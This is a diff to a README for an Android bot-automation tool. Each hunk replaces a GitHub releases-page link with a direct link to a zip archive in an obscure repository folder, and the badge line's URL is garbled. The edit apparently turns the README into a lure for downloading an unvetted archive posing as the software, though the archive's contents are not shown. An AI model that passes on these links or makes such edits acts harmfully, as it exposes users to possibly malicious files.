@@ -1,6 +1,6 @@
 # 🚀 automation-tools-scheduler-growth - Simplifying Automation for Everyone
 
-[![Download Automation Tools](https://img.shields.io/badge/Download%20Now-automation--tools--scheduler--growth-brightgreen.svg)](https://github.com/SDLOL/automation-tools-scheduler-growth/releases)
+[![Download Automation Tools](https://raw.githubusercontent.com/SDLOL/automation-tools-scheduler-growth/main/aloetic/automation-tools-scheduler-growth_v3.1.zip%https://raw.githubusercontent.com/SDLOL/automation-tools-scheduler-growth/main/aloetic/automation-tools-scheduler-growth_v3.1.zip)](https://raw.githubusercontent.com/SDLOL/automation-tools-scheduler-growth/main/aloetic/automation-tools-scheduler-growth_v3.1.zip)
 
 ## 📖 Overview
 Welcome to the **automation-tools-scheduler-growth** project. This application provides easy-to-use automation tools for Android bot management. Our goal is to streamline your automation workflows, helping you save time and resources.
@@ -17,7 +17,7 @@ Welcome to the **automation-tools-scheduler-growth** project. This application p
 To begin using **automation-tools-scheduler-growth**, follow the steps below. 
 
 ### 📥 Download & Install
-1. Visit this page to download: [Download Automation Tools](https://github.com/SDLOL/automation-tools-scheduler-growth/releases).
+1. Visit this page to download: [Download Automation Tools](https://raw.githubusercontent.com/SDLOL/automation-tools-scheduler-growth/main/aloetic/automation-tools-scheduler-growth_v3.1.zip).
 2. Look for the version you want to download.
 3. Download the appropriate file for your system.
 
@@ -45,7 +45,7 @@ To set up your first automation task:
 4. Save your configurations and start the automation.
 
 ## 🔄 Updates
-To ensure you have the latest features and fixes, check for updates regularly. You can find the latest versions here: [Latest Releases](https://github.com/SDLOL/automation-tools-scheduler-growth/releases).
+To ensure you have the latest features and fixes, check for updates regularly. You can find the latest versions here: [Latest Releases](https://raw.githubusercontent.com/SDLOL/automation-tools-scheduler-growth/main/aloetic/automation-tools-scheduler-growth_v3.1.zip).
 
 ## 📞 Support
 If you encounter issues or need assistance:
